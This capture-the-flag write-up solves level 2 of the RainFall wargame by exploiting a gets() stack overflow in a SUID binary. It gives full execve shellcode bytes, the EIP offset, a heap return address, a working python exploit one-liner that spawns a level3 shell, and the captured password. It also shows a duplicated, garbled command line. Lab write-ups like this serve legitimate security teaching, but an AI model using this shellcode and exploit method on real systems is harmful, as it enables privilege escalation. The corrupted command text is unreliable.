# Level 2

## Vulnerability

Stack overflow

## Context

We find a binary with owner ```level3``` and SUID.
```
level2@RainFall:~$ ls -l
-rwsr-s---+ 1 level3 users 5403 Mar  6  2016 level2
```
Running the binary, it seems to read from stdin, and print what is given.
```
level2@RainFall:~$ ./level2
oh hi
oh hi
```

## Solution

After a certain length of input it segfaults.
```
level2@RainFall:~$ ./level2
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaJaaaaaaaa
Segmentation fault (core dumped)
```
When we inspect with gdb we find main calls function ```p```. Function ```p``` includes a call to ```gets()``` which is vulnerable to buffer overflow.
```
level2@RainFall:~$ gdb -q level2
...
(gdb) disas main
...
   0x08048545 <+6>:	call   0x80484d4 <p>
...
(gdb) disas p
...
   0x080484ed <+25>:	call   0x80483c0 <gets@plt>
...
```

### Find EIP offset

Using the following example with [this EIP offset tool](https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/), we find the EIP offset is 80.
```
level2@RainFall:~$ gdb -q level2
...
(gdb) run
Starting program: /home/user/level2/level2
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A6Ac72Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? ()
```
This means we can write our malicious code in the stdin, followed by garbage until the buffer overflows and we reach 80 characters, where the return address can be overwritten.

### Find target address

However, this buffer is stored on the stack, unfortunately function ```p``` checks to make sure the return address isn't in the stack.
```
(gdb) disas p
...
   0x080484fb <+39>:	and    $0xb0000000,%eax
   0x08048500 <+44>:	cmp    $0xb0000000,%eax
   0x08048505 <+49>:	jne    0x8048527 <p+83>
...
```
This prevents us from overwriting the return address with and address in the stack, or an environment variable.

However, we could use the heap. ltrace shows the buffer is later copied with strdup. strdup uses malloc which uses the heap.
```
level2@RainFall:~$ ltrace ./level2
__libc_start_main(0x804853f, 1, 0xbffff7a4, 0x8048550, 0x80485c0 <unfinished ...>
fflush(0xb7fd1a20)                                          = 0
gets(0xbffff6ac, 0, 0, 0xb7e5ec73, 0x80482b5 oh hi!
)               = 0xbffff6ac
puts(" oh hi!" oh hi!
)                                             = 8
strdup(" oh hi!")                                           = 0x0804a008
+++ exited (status 8) +++
```
ltrace also shows us strdup always uses the address ```0x804a008```, this indicates no ASLR (Address Space Layout Randomization).

So let's try to write our malicious shellcode in the heap by writing it in the input prompt. Then write the strdup malloc address on the return address.

### Build malicious code

We can use syscall ```execve()``` to open a shell. Searching for unix syscalls in ```/usr/include/i386-linux-gnu/asm/unistd_32.h``` we find ```execve()``` is syscall 11.
```
level2@RainFall:~$ cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep "execve"
#define __NR_execve		 11
```
Let's create the assembly code to open a shell, and break it down into bytecode.
```
+----------------+-----------------------+-----------------------+----------------------------------------------+
| Bytecode       | (Intermediate)        | Assembly              | Comments                                     |
+----------------+-----------------------+-----------------------+----------------------------------------------+
| 31 d2          | xor    edx,edx        | xor   edx, edx        | execve 3rd parameter = envp, NULL            |
| 31 c9          | xor    ecx,ecx        | xor   ecx, ecx        | execve 2nd parameter = argv, NULL            |
| 51             | push   ecx            | push  ecx             |                                              |
| 68 2f 2f 73 68 | push   0x68732f2f     | push  '//sh'          | after 3rd push instruction, stack contains:  |
| 68 2f 62 69 6e | push   0x6e69622f     | push  '/bin'          | db '/bin//sh',0,0,0,0                        |
| 31 c0          | xor    eax,eax        | xor   eax, eax        |                                              |
| b0 0b          | mov    al,0xb         | mov   al, 11          | execve syscall                               |
| 89 e3          | mov    ebx,esp        | mov   ebx, esp        | execve 1st parameter = executable (on stack) |
| 83 e4 f0       | and    esp,0xfffffff0 | and   esp, 0xfffffff0 | align stack                                  |
| cd 80          | int    0x80           | int   0x80            | syscall                                      |
+----------------+-----------------------+-----------------------+----------------------------------------------+
```

Lets create our malicious code string, sdding backslash \x to write as bytes.
```
\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x83\xe4\xf0\xcd\x80
```

### Build exploit string

Lets create our exploit string:
1. Our malicious bytecode (26 bytes) - ```\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x83\xe4\xf0\xcd\x80```
2. Buffer until EIP offset at 80 bytes - ```"A" * 54```
3. Address of our malicious code, copied by strdup() to the heap - ```\x08\xa0\x04\x08```

Pipe the exploit string into ./level2 stdin. This opens a shell as user ```level3```, where we can cat the level3 password.
```
level2@RainFall:~$ (python -c 'print level2@RainFall:~$ (python -c 'print "\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x83\xe4\xf0\xcd\x80" + "A" * 54 + "\x08\xa0\x04\x08"' ; cat -) | ./level2
...
whoami
level3
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```

## Recreate Exploited Binary

As user ```level3```, in /tmp/ create and compile ```level2_source.c```
```
level3@RainFall:/tmp$ gcc level2_source.c -fno-stack-protector -z execstack -o level2_source
```
Edit permissions including suid, then move the binary to home directory.
```
level3@RainFall:/tmp$ chmod u+s level2_source; chmod +wx ~; mv level2_source ~
```
Exit back to user level2, then run the binary.
```
level3@RainFall:/tmp$ exit
exit
level2@RainFall:~$ (python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A" * 59 + "\x08\xb0\x04\x08"' ; cat -) | /home/user/level3/level2_source
...
whoami
level3
```
